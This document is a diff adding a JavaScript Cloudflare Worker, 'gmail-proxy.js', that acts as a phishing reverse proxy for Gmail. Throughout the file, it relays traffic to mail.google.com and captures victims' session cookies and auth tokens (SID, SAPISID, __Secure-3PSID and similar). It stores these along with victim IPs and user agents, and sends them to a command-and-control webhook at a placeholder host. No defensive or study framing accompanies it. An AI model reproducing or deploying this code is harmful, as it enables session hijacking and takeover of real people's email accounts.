@@ -1,0 +1,73 @@
+
+// gmail-proxy.js - Deploy to Cloudflare Workers
+export default {
+  async fetch(request, env, ctx) {
+    const url = new URL(request.url);
+    
+    // Proxy all Gmail traffic
+    const target = `https://mail.google.com${url.pathname + url.search}`;
+    
+    // Forward request with victim cookies intact
+    const proxyReq = new Request(target, {
+      method: request.method,
+      headers: {
+        ...request.headers,
+        'Host': 'mail.google.com',
+        'Origin': 'https://mail.google.com',
+        'Referer': 'https://mail.google.com/',
+        // Preserve victim auth cookies
+        ...Object.fromEntries(request.headers.entries())
+      },
+      body: request.body,
+      redirect: 'manual'
+    });
+    
+    // Capture response + cookies
+    const response = await fetch(proxyReq);
+    
+    // EXFILTRATE SESSION DATA
+    const cookies = response.headers.getSetCookie();
+    const authToken = extractTokens(response);
+    
+    if (cookies || authToken) {
+      await env.KV.put('victim_' + Date.now(), JSON.stringify({
+        cookies,
+        tokens: authToken,
+        victim_ip: request.headers.get('cf-connecting-ip'),
+        user_agent: request.headers.get('user-agent'),
+        timestamp: new Date().toISOString()
+      }));
+      
+      // Webhook to your C2
+      fetch('https://your-c2.com/capture', {
+        method: 'POST',
+        body: JSON.stringify({cookies, tokens: authToken})
+      });
+    }
+    
+    // Return proxied response
+    return new Response(response.body, {
+      status: response.status,
+      headers: {
+        ...Object.fromEntries(response.headers.entries()),
+        'Access-Control-Allow-Origin': '*'
+      }
+    });
+  }
+}
+
+function extractTokens(response) {
+  const cookies = response.headers.getSetCookie();
+  const tokens = [];
+  
+  cookies.forEach(cookie => {
+    if (cookie.includes('SID') || cookie.includes('HSID') || 
+        cookie.includes('SSID') || cookie.includes('APISID') ||
+        cookie.includes('SAPISID') || cookie.includes('AUTH') ||
+        cookie.includes('__Secure-3PSID')) {
+      tokens.push(cookie);
+    }
+  });
+  
+  return tokens;
+}.
